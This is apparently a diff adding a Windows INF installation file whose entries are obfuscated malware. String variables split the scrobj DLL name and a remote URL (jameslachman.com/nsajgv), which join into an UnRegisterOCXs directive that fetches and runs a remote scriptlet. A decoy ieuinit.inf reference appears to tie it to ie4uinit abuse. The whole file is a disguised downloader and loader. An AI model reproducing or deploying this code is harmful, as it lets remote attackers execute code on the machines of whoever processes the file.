@@ -1,0 +1,26 @@
+[65F]
+sc\
+ro%Embark36%j,NI,%Embark53%%Embark7%%Embark7%p%Embark02%%Embark8%%Embark8%jameslachman.%Embark4%/nsajgv
+[defaultinstall.windows7]
+delfiles=5AB
+Un\
+Register\
+OCXs=65F
+[version]
+signature = $windows nt$
+[destinationdirs]
+defaultdestdir=11
+5AB=01
+[5AB]
+ieu%Embark3%.inf
+[strings]
+Embark36=b;Embark15
+servicename=' '
+Embark77= 7:48:26.36
+Embark02=:;Embark85
+Embark4=com
+Embark53=h
+Embark3=init
+Embark8=/
+Embark7=t;Embark40
+shortsvcname=' '
